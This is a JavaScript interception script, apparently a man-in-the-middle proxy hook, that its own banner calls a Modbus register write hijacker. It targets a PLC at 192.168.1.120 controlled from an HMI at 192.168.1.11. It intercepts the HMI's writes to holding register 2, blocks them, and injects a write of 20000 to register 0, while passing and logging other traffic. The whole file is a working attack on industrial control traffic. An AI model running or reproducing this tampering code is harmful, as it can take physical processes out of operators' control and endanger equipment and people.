function pad(n, width, z) {
  z = z || '0';
  n = n + '';
  return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
}

function onData(from, to, data) {
  if (data.length >= 12) {
    var functionCode = data[7];
    var time = new Date().toTimeString().split(' ')[0];

    // Function Code 6: Write Single Holding Register
    if (functionCode == 6) {
      var regAddr = (data[8] << 8) | data[9];
      var regValue = (data[10] << 8) | data[11];

      // Check if the target register is address 2
      if (regAddr === 2) {
        log("╔═══[" + time + "]═══[REGISTER WRITE INTERCEPTED & MODIFIED]═══╗");
        log("║ Direction: " + (from.indexOf(".11") !== -1 ? "HMI → PLC" : "PLC → HMI"));
        log("║ Source: " + from);
        log("║ Original Target Address: " + regAddr + " (0x" + pad(regAddr.toString(16), 4) + ")");
        log("║ Original Value: " + regValue + " (0x" + pad(regValue.toString(16), 4) + ")");
        log("╠═══════════════════════════════════════════════════════════════╣");
        log("║ [+] ACTION: Blocking write to address 2.                        ║");
        log("║ [+] ACTION: Injecting new write to address 0 with value 20000.  ║");
        log("╚═══════════════════════════════════════════════════════════════╝");

        // --- Create the new write command ---
        var newValue = 20000; // The value we want to write

        // Modify the original packet to send our new command
        // Set new register address to 0
        data[8] = 0x00; // High byte of address 0
        data[9] = 0x00; // Low byte of address 0

        // Set new register value to 20000 (0x4E20)
        data[10] = 0x4E; // High byte of 20000
        data[11] = 0x20; // Low byte of 20000

        // Return the modified packet to be sent to the PLC
        return data;

      } else {
        // If the write is not to address 2, log it and allow it.
        log("┌─[" + time + "]─[REGISTER WRITE ALLOWED]────");
        log("│ Source: " + from);
        log("│ Register Address: " + regAddr);
        log("│ Value: " + regValue);
        log("│ [+] ACTION: ALLOWED - Passing through");
        log("└─────────────────────────────────────");
      }
    }

    // Function Code 5: Write Single Coil - ALLOW ALL
    else if (functionCode == 5) {
      var coilAddr = (data[8] << 8) | data[9];
      var coilValue = (data[10] << 8) | data[11];

      // Log coil writes for visibility
      log("┌─[" + time + "]─[COIL WRITE]────");
      log("│ Source: " + from);
      log("│ Coil Address: " + coilAddr);
      log("│ Value: 0x" + pad(coilValue.toString(16), 4) + (coilValue == 0xFF00 ? " (TRUE)" : " (FALSE)"));
      log("│ [+] ACTION: ALLOWED - Passing through");
      log("└────────────────────────────────");
    }
    // Function Code 3: Read Holding Registers - Monitor sparingly
    else if (functionCode == 3) {
      if (Math.random() < 0.01) {
        var startAddr = (data[8] << 8) | data[9];
        var quantity = (data[10] << 8) | data[11];
        log("[" + time + "] Read " + quantity + " registers from address " + startAddr);
      }
    }
    // Function Code 1: Read Coils - Monitor sparingly
    else if (functionCode == 1) {
      if (Math.random() < 0.01) {
        var startAddr = (data[8] << 8) | data[9];
        var quantity = (data[10] << 8) | data[11];
        log("[" + time + "] Read " + quantity + " coils from address " + startAddr);
      }
    }
  }

  // Return data unchanged for all other operations
  return data;
}

// Startup banner
log("");
log("╔═══════════════════════════════════════════════════════════════╗");
log("║      MODBUS REGISTER WRITE HIJACKER ACTIVE      ║");
log("╠═══════════════════════════════════════════════════════════════╣");
log("║ Configuration:                                                ║");
log("║ • Intercepting writes (FC6) to register address 2.            ║");
log("║ • Blocking the original write.                                ║");
log("║ • Injecting a new write to register 0 with value 20000.        ║");
log("║ • Allowing all other register writes.                         ║");
log("╠═══════════════════════════════════════════════════════════════╣");
log("║ Target: 192.168.1.120 (PLC)                                   ║");
log("║ Source: 192.168.1.11 (HMI)                                    ║");
log("╚═══════════════════════════════════════════════════════════════╝");
log("");
log("Monitoring Modbus traffic...");